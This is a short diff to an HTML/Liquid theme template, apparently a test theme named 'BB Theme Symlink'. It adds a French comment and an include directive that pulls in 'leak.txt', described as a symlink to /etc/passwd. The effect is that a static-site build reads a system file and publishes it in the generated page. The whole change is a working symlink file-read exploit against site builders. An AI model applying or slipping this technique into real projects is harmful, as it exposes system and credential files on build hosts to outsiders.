@@ -1,5 +1,7 @@
 <!DOCTYPE html>
 <html><body>
-<h1>BB Theme Symlink Test</h1>
+<h1>BB Theme Symlink v2</h1>
+<!-- Include du fichier symlink (leak.txt -> /etc/passwd) -->
+{% include leak.txt %}
 {{ content }}
 </body></html>
